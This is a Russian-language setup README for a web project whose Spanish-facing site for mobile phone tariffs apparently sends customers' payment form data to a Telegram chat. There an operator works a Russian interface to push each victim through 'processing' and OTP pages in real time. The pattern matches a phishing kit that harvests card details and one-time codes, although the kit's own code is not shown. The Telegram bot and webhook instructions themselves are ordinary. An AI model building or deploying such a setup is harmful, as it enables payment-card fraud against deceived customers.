# Настройка переменных окружения

Для корректной работы системы оплаты с Telegram интеграцией создайте файл `.env.local` в корне проекта со следующим содержимым:

```bash
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
TELEGRAM_CHAT_ID=your_telegram_chat_id_here

# Base URL for API calls (используется только для логирования)
NEXT_PUBLIC_BASE_URL=http://localhost:3000
```

## Как получить Telegram Bot Token:

1. Напишите @BotFather в Telegram
2. Отправьте команду `/newbot`
3. Следуйте инструкциям для создания бота
4. Скопируйте полученный токен в TELEGRAM_BOT_TOKEN

## Как получить Chat ID:

1. Добавьте вашего бота в группу или начните с ним диалог
2. Отправьте любое сообщение боту
3. Откройте в браузере: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Найдите "chat":{"id": в ответе - это ваш CHAT_ID

## Настройка webhook:

После развертывания на Vercel или другом хостинге, установите webhook:
```bash
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" \
-H "Content-Type: application/json" \
-d '{"url":"https://your-domain.com/api/telegram-webhook"}'
```

Для локального тестирования можно использовать ngrok для создания туннеля к localhost:3000.

## Исправленные проблемы:

1. ✅ **Сообщения в Telegram на русском** - все сообщения и кнопки в боте переведены
2. ✅ **Сайт остался на испанском** - пользовательский интерфейс сайта на испанском
3. ✅ **Исправлена передача состояний** - использует глобальный Map для синхронизации
4. ✅ **Добавлена обработка ошибок OTP** - новый статус `otp_error`
5. ✅ **Улучшено логирование** - подробные логи для отладки
6. ✅ **Ускорен polling** - проверка статуса каждую секунду
7. ✅ **Исправлены переходы** - правильная логика редиректов

## Тестирование системы:

1. **Основной поток**: `/tarifas-moviles` → выбор тарифа → `/cart` → `/payment` → `/processing` → `/otp` → `/success`

2. **Тестовая страница**: `/test-payment` - для проверки работы API без Telegram

3. **Проверка логов**: Откройте DevTools в браузере и терминал сервера для просмотра логов

## Логика работы:

1. **Пользователь** заполняет форму оплаты → данные отправляются в Telegram (русский)
2. **Администратор** в Telegram видит заявку и нажимает кнопки (русский интерфейс)
3. **Система** обновляет статус через webhook → клиент получает обновления через polling
4. **Пользователь** видит изменения на сайте (испанский интерфейс)

## Отладка:

- Используйте `/test-payment` для тестирования без Telegram
- Проверьте логи в терминале сервера (все API вызовы логируются)
- Убедитесь что sessionId совпадает в Telegram и на сайте 